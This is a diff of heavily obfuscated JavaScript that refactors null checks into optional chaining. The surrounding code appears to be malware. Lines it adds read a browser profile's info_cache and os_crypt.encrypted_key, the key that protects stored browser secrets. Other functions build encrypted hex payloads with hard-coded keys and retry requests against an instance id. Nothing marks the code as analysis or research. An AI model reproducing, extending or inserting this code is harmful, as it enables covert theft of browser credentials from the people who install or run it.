@@ -805,9 +805,6 @@
         _0x3f48d5 = _0x3f48d5.replace(/-/g, '');
         return Buffer.from("276409396fcc0a23" + _0x3f48d5.substring(0, 16), "hex");
       }
-      function _0x5a2c2b() {
-        return "A0FB";
-      }
       function _0xd7a40f() {
         return Uint8Array.from([162, 140, 252, 232, 178, 47, 68, 146, 150, 110, 104, 76, 128, 236, 129, 43]);
       }
@@ -850,7 +847,7 @@
         _0x524689.setAutoPadding(true);
         let _0x2a72ea = _0x524689.update(_0xfe1824, "utf8", "hex");
         _0x2a72ea += _0x524689.final("hex");
-        return _0x5079be.toString("hex").toUpperCase() + _0x5a2c2b() + _0x2a72ea.toUpperCase();
+        return _0x5079be.toString("hex").toUpperCase() + "A0FB" + _0x2a72ea.toUpperCase();
       }
       function _0x2ae848(_0x85ce9e, _0x599185) {
         const _0x5b465b = require("crypto");
@@ -972,11 +969,8 @@
           return {};
         }
       }
-      function _0x1a78cb(_0x1cfbc2, _0x5e417d) {
-        return typeof (_0x1cfbc2 === null || _0x1cfbc2 === undefined ? undefined : _0x1cfbc2[_0x5e417d]) === "string" ? _0x1cfbc2[_0x5e417d] : '';
-      }
       function _0x127253(_0x355426, _0x2d5cb4) {
-        return typeof (_0x355426 === null || _0x355426 === undefined ? undefined : _0x355426[_0x2d5cb4]) === "object" ? _0x355426[_0x2d5cb4] : {};
+        return typeof _0x355426?.[_0x2d5cb4] === "object" ? _0x355426[_0x2d5cb4] : {};
       }
       function _0x32ba7e(_0x413476) {
         const _0x4a891b = require("path");
@@ -1074,7 +1068,7 @@
         for (let _0x39b871 = 0; _0x39b871 < 3; _0x39b871++) {
           _0x41c702.I489V4T = _0x258343();
           const _0x58c393 = await _0xf49302(_0x41c702, _0x4607a4);
-          if (_0x58c393 && _0x1a78cb(_0x2721c7(_0x58c393), "iid") === _0x46394b) {
+          if (_0x58c393 && (typeof _0x2721c7(_0x58c393)?.iid === "string" ? _0x2721c7(_0x58c393).iid : '') === _0x46394b) {
             break;
           }
           await new Promise((_0xa0f65a) => setTimeout(_0xa0f65a, 3000));
@@ -1394,12 +1388,12 @@
       }
       async function _0x3f86a4(_0x44a778) {
         const _0x5c62f9 = _0x2721c7(_0x44a778);
-        const _0x3e8bb0 = _0x1a78cb(_0x5c62f9, "iid");
+        const _0x3e8bb0 = typeof _0x5c62f9?.iid === "string" ? _0x5c62f9.iid : '';
         if (_0x3e8bb0 != _0x46394b) {
           _0x481ac6.w3F3UWA.s59BT06('');
           return;
         }
-        const _0x41f1d5 = _0x1a78cb(_0x5c62f9, "data");
+        const _0x41f1d5 = typeof _0x5c62f9?.data === "string" ? _0x5c62f9.data : '';
         if (_0x41f1d5.length == 0) {
           _0x481ac6.w3F3UWA.s59BT06('');
           return;
@@ -2290,15 +2284,13 @@
           await this.E4E2LLU(100);
         }
         async A554U7Y(_0x214ff8, _0x4bd0d9, _0x79e2ac = false) {
-          var _0x2192a3;
-          var _0xcb454f;
           const _0x480562 = require("fs");
           try {
             const _0x597d54 = _0x480562.readFileSync(_0x4bd0d9, "utf8");
             const _0x5b114d = JSON.parse(_0x597d54);
-            const _0x136648 = Object.keys(((_0x2192a3 = _0x5b114d.profile) === null || _0x2192a3 === undefined ? undefined : _0x2192a3.info_cache) || {});
+            const _0x136648 = Object.keys(_0x5b114d.profile?.info_cache || {});
             _0x5c23fd.w3F3UWA.s59BT06('');
-            const _0x56310e = _0x79e2ac ? ((_0xcb454f = _0x5b114d.os_crypt) === null || _0xcb454f === undefined ? undefined : _0xcb454f.encrypted_key) || '' : '';
+            const _0x56310e = _0x79e2ac ? _0x5b114d.os_crypt?.encrypted_key || '' : '';
             _0x5c23fd.w3F3UWA.s59BT06('');
             return [_0x136648, _0x56310e];
           } catch (_0x5d4a1b) {
@@ -2615,7 +2607,6 @@
           }
         }
         async w5C1TZN(_0x39c6dc) {
-          var _0x30caf3;
           const _0x1eef6d = _0xa0200c.q5A5TD7;
           const _0x2728bd = require("path");
           const _0x422593 = _0x1ebf7f.S559FZQ.D47CBV3();
@@ -2629,7 +2620,7 @@
             const _0x3f1af9 = _0x13b83b.readFileSync(_0x451ec0, "utf8");
             let _0x38d94e = JSON.parse(_0x3f1af9);
             const _0x221c35 = _0x38d94e[""] ?? true;
-            const _0x735adc = ((_0x30caf3 = _0x38d94e[""]) === null || _0x30caf3 === undefined ? undefined : _0x30caf3[""]) ?? true;
+            const _0x735adc = _0x38d94e[""]?.[""] ?? true;
             const _0x7d40e4 = _0x38d94e[""] ?? true;
             const _0x3b7d16 = _0x38d94e[""] ?? true;
             const _0x430827 = await this.g4EE56L("wv-key");
